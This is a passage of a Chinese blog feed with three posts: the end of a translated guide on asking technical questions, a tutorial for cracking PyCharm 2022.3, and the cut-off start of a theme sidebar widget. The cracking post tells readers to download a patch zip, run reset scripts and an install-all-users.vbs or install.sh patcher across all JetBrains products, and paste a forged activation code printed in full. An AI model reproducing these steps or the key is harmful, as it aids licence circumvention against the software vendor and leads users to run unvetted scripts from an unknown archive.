href="#如何解读回答" class="headerlink" title="如何解读回答"></a>如何解读回答</h3><h4 id="“读读该死的手册”（RTFM）和“搜搜该死的网络”（STFW）：如何明白你已完全搞砸"><a href="#“读读该死的手册”（RTFM）和“搜搜该死的网络”（STFW）：如何明白你已完全搞砸" class="headerlink" title="“读读该死的手册”（RTFM）和“搜搜该死的网络”（STFW）：如何明白你已完全搞砸"></a>“读读该死的手册”（RTFM）和“搜搜该死的网络”（STFW）：如何明白你已完全搞砸</h4><p>有一个古老而神圣的传统：如果你收到 <code>读读该死的手册</code>（RTFM） 的回复，发信人认为你应该去“读读该死的手册”。他或她多半是对的，去读一下吧。</p><p>“读读该死的手册”（RTFM）有个年轻一点的亲戚，如果你收到“搜搜该死的网络”（STFW）的回复，发信人认为你应该“搜搜该死的网络”。那人多半也是对的，去搜一下吧。(更温和一点的说法是“<a href="http://lmgtfy.com/">谷歌是你的朋友！</a>”)</p><p>在论坛，你也可能被要求去搜索论坛的文档。事实上，有人甚至可能热心地为你提供以前解决此问题的线索。但不要依赖这种关照，提问前应该先搜索一下文档。</p><p>通常，叫你搜索的人已经打开了能解决你问题的手册或网页，正在一边看一边敲键盘。这些回复意味着他认为：</p><ul><li>第一，你要的信息很容易找到。</li><li>第二，自已找要比别人喂到嘴里能学得更多。</li></ul><p>你不应该觉得这样就被冒犯了，按黑客的标准，回复者没有不理你就是在向你表示某种尊敬，你反而应该感谢他热切地想帮助你。</p><h4 id="如果还不明白……"><a href="#如果还不明白……" class="headerlink" title="如果还不明白……"></a>如果还不明白……</h4><p>如果你看不懂回答，不要马上回复一个要求说明的消息，先试试那些最初提问时用过的相同工具（如手册、FAQ、网页、懂行的朋友等）试着搞懂回答。如果还是需要说明，展现你已经明白的。</p><p>譬如，假如我告诉你：“看起来象是某输入项有问题，你需要清除它”，接着是个 不好 的回帖：“什么是某输入项？”。而这是一个 很好 的跟帖：“是的，我读了手册，某某输入项只在 -z 和 -p 开关中被提到，但都没有涉及到如何清除它们，你指的是哪一个还是我弄错了什么？”</p><h4 id="对待无礼"><a href="#对待无礼" class="headerlink" title="对待无礼"></a>对待无礼</h4><p>很多黑客圈子中看似无礼的行为并不是存心冒犯。相反，它是直接了当、一针见血式的交流风格，这种风格对于更关注解决问题而不是使别人感觉舒服而混乱的人是很自然的。</p><p>如果你觉得被冒犯了，试着平静地反应。如果有人真的做了过格的事，邮件列表、新闻组或论坛中的前辈多半会招呼他。如果这 没有 发生而你却光火了，那么你发火对象的言语可能在黑客社区中看起来是正常的，而 你 将被视为有错的一方，这将伤害到你获取信息或帮助的机会。</p><p>另一方面，你会偶而真的碰到无礼和无聊的言行。与上述相反，对真正的冒犯者狠狠地打击、用犀利的语言将其驳得体无完肤都是可以接受的。然尔，在行事之前一定要非常非常的有根据。纠正无礼的言论与开始一场毫无意义的口水战仅一线之隔，黑客们自己莽撞地越线的情况并不鲜见。如果你是新手或外来者，避开这种莽撞的机会并不高。如果你想得到的是信息而不是消磨时光，这时最好不要把手放在键盘上以免冒险。</p><p>（有些人断言很多黑客都有轻度的自闭症或阿斯伯格综合症，缺少用于润滑人类社会“正常”交往所需的脑电路。这既可能是真也可能是假。如果你自己不是黑客，兴许你认为我们脑袋有问题还能帮助你应付我们的古怪行为。只管这么干好了，我们不在乎。我们 喜欢 现在这个样子，并且一般都对病号标记有站得住脚的怀疑。）</p><p>在下一节，我们会谈到另一个问题，当 你 行为不当时会受到的“冒犯”。</p><h3 id="别象失败者那样反应"><a href="#别象失败者那样反应" class="headerlink" title="别象失败者那样反应"></a>别象失败者那样反应</h3><p>在黑客社区的论坛中有那么几次你可能会搞砸──以本文描述或类似的方式。你会被示众是如何搞砸的，也许言语中还会带点颜色。</p><p>这种事发生以后，你能做的最糟糕的事莫过于哀嚎你的遭遇、宣称被口头攻击、要求道歉、高声尖叫、憋闷气、威胁诉诸法律、向其雇主报怨、忘了关马桶盖等等。相反，你该这样去做：</p><p>熬过去，这很正常。事实上，它是有益健康与恰当的。</p><p>社区的标准不会自己维持，它们是通过参与者积极而 公开 地执行来维持的。不要哭嚎所有的批评都应该通过私下的邮件传送，这不是事情运作的方式。当有人评论你的一个说法有误或者提出不同看法时，坚持声称受到个人攻击也毫无益处，这些都是失败者的态度。</p><p>也有其它的黑客论坛，受过高礼节要求的误导，禁止参与者张贴任何对别人帖子挑毛病的消息，并声称“如果你不想帮助用户就闭嘴”。有思路的参与者纷纷离开的结果只会使它们变成了毫无意义的唠叨与无用的技术论坛。</p><p>是夸张的“友谊”（以上述方式）还是有用？挑一个。</p><p>记着：当黑客说你搞砸了，并且(无论多么刺耳地)告诉你别再这样做时，他正在为关心你和他的社区而行动。对他而言，不理你并将你从他的生活中滤除要容易得多。如果你无法做到感谢，至少要有点尊严，别大声哀嚎，也别因为自己是个有戏剧性超级敏感的灵魂和自以为有资格的新来者，就指望别人象对待脆弱的洋娃娃那样对你。</p><p>有时候，即使你没有搞砸（或者只是别人想象你搞砸了）， 有些人也会无缘无故地攻击你本人。在这种情况下，报怨倒是 真的 会把问题搞砸。</p><p>这些找茬者要么是毫无办法但自以为是专家的不中用家伙，要么就是测试你是否真会搞砸的心理专家。其它读者要么不理睬，要么用自己的方式对付他们。这些找茬者在给自己找麻烦，这点你不用操心。</p><p>也别让自己卷入口水战，大多数口水战最好不要理睬──当然，是在你核实它们只是口水战、没有指出你搞砸的地方，而且没有巧妙地将问题真正的答案藏于其中之后（这也是可能的）。</p><h3 id="提问禁忌"><a href="#提问禁忌" class="headerlink" title="提问禁忌"></a>提问禁忌</h3><p>下面是些典型的愚蠢问题和黑客不回答它们时的想法。</p><p>问：我到哪可以找到某程序或 X 资源？</p><p>问：我怎样用 X 做 Y？</p><p>问：如何配置我的 shell 提示？</p><p>问：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 文档转为 TeX 格式吗？</p><p>问：我的{程序、配置、SQL 语句}不运行了</p><p>问：我的视窗电脑出问题了，你能帮忙吗？</p><p>问：我的程序不运行了，我认为系统工具X有问题</p><p>问：我安装 Linux 或 X 遇到困难，你能帮忙吗？</p><p>问：我如何才能破解超级用户口令&#x2F;盗取通道操作员的特权&#x2F;查看某人的电子邮件？</p><hr><p>问：</p><blockquote><p>我到哪可以找到某程序或 X 资源？</p></blockquote><p>答：</p><blockquote><p>在我找到它的同样地方，笨旦──在网页搜索引擎上。上帝啊，难道还有人不知道如何使用 谷歌 吗？</p></blockquote><p>问：</p><blockquote><p>我怎样用 X 做 Y？</p></blockquote><p>答：</p><blockquote><p>如果你想解决的是 Y，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对要解决的 Y 问题糊涂，还被特定形势禁锢了思维。等他们把问题弄好再说。</p></blockquote><p>问：</p><blockquote><p>如何配置我的 shell 提示？</p></blockquote><p>答：</p><blockquote><p>如果你有足够的智慧提这个问题，你也该有足够的智慧去 “读读该死的手册”（RTFM），然后自己去找出来。</p></blockquote><p>问：</p><blockquote><p>我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 文档转为 TeX 格式吗？</p></blockquote><p>答：</p><blockquote><p>试试就知道了。如果你试过，你既知道了答案，又不用浪费我的时间了。</p></blockquote><p>问：</p><blockquote><p>我的{程序、配置、SQL 语句}不运行了</p></blockquote><p>答：</p><blockquote><p>这不是一个问题，我也没有兴趣去猜你有什么问题──我有更要紧的事要做。看到这种东西，我的反应一般如下：</p></blockquote><ul><li>你还有什么补充吗？</li><li>噢，太糟了，希望你能搞定。</li><li>这跟我究竟有什么关系？</li></ul><p>问：</p><blockquote><p>我的视窗电脑出问题了，你能帮忙吗？</p></blockquote><p>答：</p><blockquote><p>是的，把视窗垃圾删了，装个象 Linux 或 BSD 的开源操作系统吧。</p></blockquote><p>注意：如果程序有官方的视窗版或者与视窗有交互(如 Samba)，你 可以 问与视窗相关的问题，只是别对问题是由视窗操作系统而不是程序本身造成的回复感到惊讶，因为视窗一般来说太差，这种说法一般都成立。</p><p>问：</p><blockquote><p>我的程序不运行了，我认为系统工具 X 有问题</p></blockquote><p>答：</p><blockquote><p>你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与库文件有明显缺陷的人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有清楚而详尽的缺陷说明文档作后盾。</p></blockquote><p>问：</p><blockquote><p>我安装 Linux 或 X 遇到困难，你能帮忙吗？</p></blockquote><p>答：</p><blockquote><p>不行，我需要亲手操作你的电脑才能帮你排错，去向当地的 Linux 用户组寻求方便的帮助（你可以在 这里 找到用户组列表）</p></blockquote><p>注意：如果安装问题与某 Linux 发行版有关，在针对 它 的邮件列表、论坛或本地用户组织中提问也许是恰当的。此时，应描述问题的准确细节。在此之前，先用 “linux”和 所有 被怀疑的硬件 [作关键词] 仔细搜索。</p><p>问：</p><blockquote><p>我如何才能破解超级用户口令&#x2F;盗取通道操作员的特权&#x2F;查看某人的电子邮件？</p></blockquote><p>答：</p><blockquote><p>想做这种事情说明你是个卑劣的家伙，想让黑客教你做这种事情说明你是个白痴。</p></blockquote><h4 id="好问题与坏问题"><a href="#好问题与坏问题" class="headerlink" title="好问题与坏问题"></a>好问题与坏问题</h4><p>最后，我将通过举例来演示提问的智慧。同样的问题两种提法，一种愚蠢，另一种明智。</p><p>愚蠢：我在哪能找到关于 Foonly Flurbamatic 设备的东西？</p><blockquote><p>这个问题在乞求得到 “搜搜该死的网络”（STFW） 式的回复。</p></blockquote><p>明智： 我用谷歌搜索过“Foonly Flurbamatic 2600”，但没有找到什么有用的，有谁知道在哪能找到这种设备的编程信息？</p><blockquote><p>这个人已经搜索过网络了，而且听起来他可能真的遇到了问题。</p></blockquote><p>愚蠢： 我不能编译某项目的源代码，它为什么这么破？</p><blockquote><p>提问者假设是别人搞砸了，太自大了。</p></blockquote><p>明智： 某项目的源代码不能在某 Linux 6.2 版下编译。我读了常见问题文档，但其中没有与某 Linux 相关的内容。这是编译时的记录，我做错了什么吗？</p><blockquote><p>提问者已经指明了运行环境，读了常见问题文档（FAQ），列出了错误，也没有假设问题是别人的过错，这家伙值得注意。</p></blockquote><p>愚蠢： 我的主板有问题，谁能帮我？</p><blockquote><p>某黑客对此的反应可能是：“是的，还需要帮你拍背和换尿布吗？”，然后是敲下删除键。</p></blockquote><p>明智： 我在 S2464 主板上试过 X、Y 和 Z，当它们都失败后，又试了 A、B 和 C。注意我试 C 时的奇怪症状，显然某某东西正在做某某事情，这不是期望的行为。通常在 Athlon MP 主板上导致某某事情的原因是什么？有谁知道我还能再试点什么以确定问题？</p><blockquote><p>相反地，这个人看来值得回答。他或她展现了解决问题的能力而不是坐等天上掉馅饼。</p></blockquote><p>在最后那个问题中，注意“给我一个回答”与“请帮我看看我还能再做点什么测试以得到启发”之间细微但重要的差别。</p><p>事实上，最后那个问题基本上源于 2001 年 8 月 Linux 内核邮件列表（lkml）上的真实事件，是我（Eric）当时提了那个问题，我发现 Tyan S2462 主板有神秘的死机现象，邮件列表成员给我提供了解决此问题的关键信息。</p><p>通过这种提问方式，我给了别人可以咀嚼玩味的东西。我设法使之对参与者既轻松又有吸引力，也表明了对同行能力的尊敬并邀请他们与我一起协商。通过告诉他们我已经走过的弯路，我还表明了对他们宝贵时间的尊重。</p><p>事后，当我感谢大家并评论这次良好的经历时，一个 Linux 内核邮件列表的成员谈到，他认为我得到答案并不是因为我的名字挂在列表上，而只是因为我正确的提问方式。</p><p>黑客们在某种方面是非常不留情面的精英分子。我想在这事上他是对的，如果我 表现得 象个不劳而获的寄生虫，不管我是谁都会被忽略或斥责。他建议将整个事件作为对其它人提问的指导，这直接导致了本文的编写。</p><h3 id="如果得不到回答"><a href="#如果得不到回答" class="headerlink" title="如果得不到回答"></a>如果得不到回答</h3><p>如果得不到回答，请不要认为我们不想帮你，有时只是因为被问到的小组成员的确不知道答案。没有回复不等于不被理睬，当然必须承认从外面很难看出两者的差别。</p><p>一般而言，直接将问题再张贴一次不好，这会被视为毫无意义的骚扰。耐心一点，知道你问题答案的人可能生活在不同的时区，有可能正在睡觉，也有可能你的问题一开始就没有组织好。</p><p>还有其它资源可以寻求帮助，通常是在一些面向新手的资源中。</p><p>有许多在线与本地的用户组织，虽然它们自己不编写任何软件，但是对软件很热心。这些用户组通常因互助和帮助新手而形成。</p><p>还有众多大小商业公司提供签约支持服务，别因为要付点钱才有支持就感到沮丧！毕竟，如果你车子的汽缸垫烧了，你多半还得花钱找个修理店把它弄好。即使软件没花你一分钱，你总不能指望服务支持都是免费的。</p><p>象 Linux 这样流行的软件，每个开发者至少有一万个以上的用户，一个人不可能应付这么多用户的服务要求。记住，即使你必须付费才能得到支持，也比你还得额外花钱买软件要少得多（而且对封闭源代码软件的服务支持与开源软件相比通常还要贵一点，也要差一点）。</p><h3 id="如何更好地回答"><a href="#如何更好地回答" class="headerlink" title="如何更好地回答"></a>如何更好地回答</h3><p>态度和善一点。问题带来的压力常使人显得无礼或愚蠢，其实并不是这样。</p><p>对初犯者私下回复。 对那些坦诚犯错之人没有必要当众羞辱，一个真正的新手也许连怎么搜索或在哪找 FAQ 都不知道。</p><p>如果你不确定，一定要说出来！ 一个听起来权威的错误回复比没有还要糟，别因为听起来象个专家好玩就给别人乱指路。要谦虚和诚实，给提问者与同行都树个好榜样。</p><p>如果帮不了忙，别妨碍。 不要在具体步骤上开玩笑，那样也许会毁了用户的安装──有些可怜的呆瓜会把它当成真的指令。</p><p>探索性的反问以引出更多的细节。 如果你做得好，提问者可以学到点东西──你也可以。试试将很差的问题转变成好问题，别忘了我们都曾是新手。</p><p>尽管对那些懒虫报怨一声“读读该死的手册”（RTFM）是正当的，指出文档的位置（即使只是建议做个谷歌关键词搜索）会更好</p><p>如果你决意回答，给出好的答案。 当别人正在用错误的工具或方法时别建议笨拙的权宜之计，应推荐更好的工具，重新组织问题。</p><p>请回答真正的问题！如果提问者已经做了自己该做的研究，并且说明尝试过 <code>X，Y，Z，A，B 与 C</code> 都没有得到想要的結果，那么回复 <code>试试 A 或 B</code> 或者给出一个内容为 <code>试一下 X，Y，Z，A，B 或 C</code> 的链接将极其无益！</p><p>帮助你的社区从中学习。当回复一个好问题时，问问自己 <code>如何修改相关文件或 FAQ 文档以免再次解答同样的问题？</code>，接着再向文档维护者发一份补丁。</p><p>如果你是在研究一番后才做出的回答，展现你的技巧而不是直接端出结果。毕竟“授人以鱼，不如授人以渔”。</p><h3 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h3><p>如果需要个人电脑、Unix 和互联网如何工作的基础知识，参阅 <a href="http://en.tldp.org/HOWTO/Unix-and-Internet-Fundamentals-HOWTO/">Unix 和互联网工作的基本原理</a>。</p><p>当你发布软件或补丁时，试着按 <a href="http://en.tldp.org/HOWTO/Software-Release-Practice-HOWTO/index.html">软件发布实践</a> 操作。</p><h3 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h3><p>伊夫林.米切尔（Evelyn Mitchell）贡献了一些愚蠢问题例子并启发了编写<code>如何更好地回答问题</code>这一节，米哈伊尔.罗门迪克（Mikhail Ramendik）贡献了一些特别有价值的建议和改进。</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分享 </tag>
            
            <tag> 提问的智慧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PyCharm2022.3 破解教程，破解补丁一键脚本激活（亲测有效）</title>
      <link href="/429.html"/>
      <url>/429.html</url>
      
        <content type="html"><![CDATA[<p>本次破解的是 PyCharm 2022.3，下面是最新的激活教程，激活步骤和之前是类似的，只是换用了不同的补丁文件。</p><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>在 pycharm 官网下载安装包并且安装在自己电脑上。</p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>如果你电脑上的pycharm之前就使用过其他激活教程，那么我建议你先重置你的pycharm。这样能避免因为以前的激活补丁而导致永久激活失败，后期失效了又得折腾是很麻烦的。（<strong>Ps：新电脑新安装的pycharm无需重置，可以直接跳过这一步直接开始激活。</strong>）</p><p>重置pycharm也很方便了，这里准备了脚本给大家，双击运行脚本就重置好了。</p><p>在补丁文件中打开 <code>重置脚本</code> 这个文件夹（补丁文件在步骤3中下载）</p><p><img src="https://blog.gjcloak.top/wp-content/uploads/2023/03/2789447446.png"></p><p>里面有两个脚本，一个是用于Mac、Linux系统的，另一个是用于Windows系统的！<br><img src="https://blog.gjcloak.top/wp-content/uploads/2023/03/490659172.png"></p><p>比如使用Windows系统的脚本，我们双击运行之后显示了这么一个弹窗就表示重置成功了！<br><img src="https://blog.gjcloak.top/wp-content/uploads/2023/03/4256729485.png"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>下载补丁文件</p><p>[hidecontent type&#x3D;”reply” desc&#x3D;”隐藏内容：评论后查看”]</p><p><a href="https://blog.gjcloak.top/wp-content/uploads/2023/03/3239682614.zip">补丁</a></p><p>点击链接进行下载</p><p>激活文件下载之后，将文件解压后直接放在D盘下面（Ps：放置的位置大家随意，只要后续不删除就行。）</p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>还是在补丁文件中，打开 <code>scripts</code> 这个文件夹。</p><p><img src="https://blog.gjcloak.top/wp-content/uploads/2023/03/3158836312.png"></p><p>看到下图框选的两个脚本</p><ul><li>install.sh：是用于Mac和Linux系统的激活脚本。</li><li>install-all-users.vbs：是用于Windows系统的激活脚本。</li></ul><p><img src="https://blog.gjcloak.top/wp-content/uploads/2023/03/2569492551.png"></p><p>这里举例Windows系统，双击 install-all-users.vbs 脚本会出现一个弹窗，我们点击确定。</p><p><img src="https://blog.gjcloak.top/wp-content/uploads/2023/03/141926856.png"></p><p>等几秒钟还会出现一个小弹窗，继续点击确定就好了。</p><p><img src="https://blog.gjcloak.top/wp-content/uploads/2023/03/3569515437.png"></p><blockquote><p>注意：这个激活脚本是支持 JetBrains 所有产品的！也就是说脚本运行一次之后，你电脑上安装的所有 JetBrains 软件就都可以进行破解了，直接按照后面的步骤输入激活码就行！比如你电脑上现在安装了pycharm 和PyCharm这两款软件，上面的激活脚本你只需要运行一次就可以了！而且后续如果你再安装其他 JetBrains 的软件也不需要再运行激活脚本，直接按照后面的步骤输入激活码就可以了！</p></blockquote><h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p>然后我们打开 <code>pycharm</code> ，如下图所示点击 <code>Activation code</code> 。</p><p><img src="https://blog.gjcloak.top/wp-content/uploads/2023/03/915150123.png"></p><h3 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h3><p>然后复制下面的激活码粘贴进去。</p><p>[hidecontent type&#x3D;”reply” desc&#x3D;”隐藏内容：评论后查看”]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EUWT4EE9X2-eyJsaWNlbnNlSWQiOiJFVVdUNEVFOVgyIiwibGljZW5zZWVOYW1lIjoic2lnbnVwIHNjb290ZXIiLCJhc3NpZ25lZU5hbWUiOiIiLCJhc3NpZ25lZUVtYWlsIjoiIiwibGljZW5zZVJlc3RyaWN0aW9uIjoiIiwiY2hlY2tDb25jdXJyZW50VXNlIjpmYWxzZSwicHJvZHVjdHMiOlt7ImNvZGUiOiJQU0kiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBDIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUFBDIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQV1MiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBDV01QIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfV0sIm1ldGFkYXRhIjoiMDEyMDIyMDkwMlBTQU4wMDAwMDUiLCJoYXNoIjoiVFJJQUw6MzUzOTQ0NTE3IiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-FT9l1nyyF9EyNmlelrLP9rGtugZ6sEs3CkYIKqGgSi608LIamge623nLLjI8f6O4EdbCfjJcPXLxklUe1O/5ASO3JnbPFUBYUEebCWZPgPfIdjw7hfA1PsGUdw1SBvh4BEWCMVVJWVtc9ktE+gQ8ldugYjXs0s34xaWjjfolJn2V4f4lnnCv0pikF7Ig/Bsyd/8bsySBJ54Uy9dkEsBUFJzqYSfR7Z/xsrACGFgq96ZsifnAnnOvfGbRX8Q8IIu0zDbNh7smxOwrz2odmL72UaU51A5YaOcPSXRM9uyqCnSp/ENLzkQa/B9RNO+VA7kCsj3MlJWJp5Sotn5spyV+gA==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure><p><img src="https://blog.gjcloak.top/wp-content/uploads/2023/03/3606232141.png"></p><h3 id="第七步"><a href="#第七步" class="headerlink" title="第七步"></a>第七步</h3><p>激活码粘贴之后如下图所示，就说明有效，然后我们点击 <code>Activate</code> 激活。</p><p><img src="https://blog.gjcloak.top/wp-content/uploads/2023/03/1717840179.png"></p><h3 id="第八步"><a href="#第八步" class="headerlink" title="第八步"></a>第八步</h3><p>最后就激活成功了，点击 Continue 关闭窗口就好了。</p><p><img src="https://blog.gjcloak.top/wp-content/uploads/2023/03/3108120593.png"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PyCharm </tag>
            
            <tag> 教程 </tag>
            
            <tag> 激活码 </tag>
            
            <tag> 补丁 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>handsome侧边栏添加热搜排行榜</title>
      <link href="/400.html"/>
      <url>/400.html</url>
      
        <content type="html"><![CDATA[<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cos.gjcloak.xyz/yun/202302250950498.png?imageMogr2/format/webp/interlace/1/quality/80"><br><img src="https://cos.gjcloak.xyz/yun/202302250951561.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>在 <code>sidebar.php</code> 文件中添加以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 热搜 --&gt;</span><br><span class="line">&lt;section class=&quot;widget widget_tag_cloud wrapper-md clear&quot; id=&quot;hot&quot;&gt;</span><br><span class="line">    &lt;h5 class=&quot;widget-title m-t-none text-md&quot;&gt;热搜排行&lt;/h5&gt;</span><br><span class="line">    &lt;div class=&quot;tab-container&quot;&gt;</span><br><span class="line">        &lt;ul class=&quot;nav nav-tabs&quot;&gt;</span><br><span class="line">            &lt;li class=&quot;active&quot; style=&quot;width: 50%;&quot;&gt;&lt;a style=&quot;margin-right: 0px;text-align:center&quot; href=&quot;&quot; data-toggle=&quot;tab&quot; data-target=&quot;#tab_baidu_hot&quot; aria-expanded=&quot;true&quot;&gt;百度&lt;span class=&quot;badge bg-danger badge-sm m-l-xs&quot; id=&quot;baidu_hot_num&quot;&gt;&lt;i class=&quot;animate-spin fontello fontello-refresh&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li class=&quot;&quot; style=&quot;width: 50%;&quot;&gt;&lt;a style=&quot;margin-right: 0px;text-align:center&quot; href=&quot;&quot; data-toggle=&quot;tab&quot; data-target=&quot;#tab_douyin_hot&quot; aria-expanded=&quot;false&quot;&gt;抖音&lt;span class=&quot;badge bg-danger badge-sm m-l-xs&quot; id=&quot;douyin_hot_num&quot;&gt;&lt;i class=&quot;animate-spin fontello fontello-refresh&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">        &lt;div class=&quot;tab-content&quot; style=&quot;background-color: unset;border: unset;padding-top: 1px; &quot;&gt;</span><br><span class="line">            &lt;div class=&quot;tab-pane active&quot; id=&quot;tab_baidu_hot&quot;&gt;</span><br><span class="line">                &lt;ul class=&quot;list-group no-borders pull-in m-b-none&quot; id=&quot;baidu_hot&quot;&gt;</span><br><span class="line">                </span><br><span class="line">                &lt;/ul&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class=&quot;tab-pane&quot; id=&quot;tab_douyin_hot&quot;&gt;</span><br><span class="line">                &lt;ul class=&quot;list-group list-group-alt list-group-lg no-borders pull-in m-b-none&quot; id=&quot;douyin_hot&quot;&gt;</span><br><span class="line">                    </span><br><span class="line">                &lt;/ul&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/section&gt;</span><br></pre></td></tr></table></figure><p>具体加在模板 <code>component</code> 文件夹中 <code>sidebar.php</code> 文件里<br>找到 <code>博客信息</code> 这个注释 在前面加上代码</p><p><img src="https://cos.gjcloak.xyz/yun/202302250953367.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>在后台主题设置添加自定义JS代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 